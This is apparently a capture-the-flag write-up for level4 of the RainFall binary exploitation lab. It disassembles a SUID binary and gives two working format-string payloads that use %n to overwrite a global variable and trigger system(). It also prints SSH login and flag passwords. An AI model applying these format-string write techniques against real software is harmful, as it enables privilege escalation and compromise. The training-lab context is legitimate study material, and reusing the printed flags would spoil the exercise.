Login as `level4`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.1.28 -p 4242 -l level4
level4@192.168.1.28's password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
A `SUID` executable is located in the home directory.
```shell
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```
Examine defined functions
```gdb
(gdb) info functions
[...]
0x08048444  p
0x08048457  n
0x080484a7  main
[...]
```
Global variable `m` is compared to `0x1025544` value. As it stored in `.bss` section - declared but have not been assigned a value.
```gdb
(gdb) disassemble n
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
```
Here two method to overwrite variable `m` with value `0x01025544`.

The first method, dirty and long, consist in writing 16930116 bytes and use `%n` to write this value (`0x01025544` in Hex) to selected address.
```gdb
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%016930112x%12$n"' | ./level4
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000[...]b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

The second one, is more creative and faster. It consit in writing in each byte of variable `m` which is lay between `0x08049810` to `0x08049813`.
First of all, those byte addresses where values should be written are putted on stack. Then, the value which should be written is divided by bytes `0x44`, `0x55`, `0x02`, `0x01`. It is done to calculate an offset for each value. This offest value would be a number which will be written in carefully-selected address. As addresses were placed previously, they can be selected using direct parameter access `$`.

0x44 = 68   | 4+4+4+4+x             = 68  (0x44)  : x = 52
0x55 = 85   | 4+4+4+4+52+x          = 85  (0x55)  : x = 17
0x02 = 2    | 4+4+4+4+52+17+x       = 258 (0x102) : x = 173
0x01 = 1    | 4+4+4+4+52+17+173+x   = 513 (0x201) : x = 255

```shell
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "\x13\x98\x04\x08" + "%052x%12$n" + "%017x%13$n" + "%0173x%14$n" + "%0255x%15$n"' | ./level4
00000000000000000000000000000000000000000000b7ff26b0000000000bffff794000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b7fd0ff4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
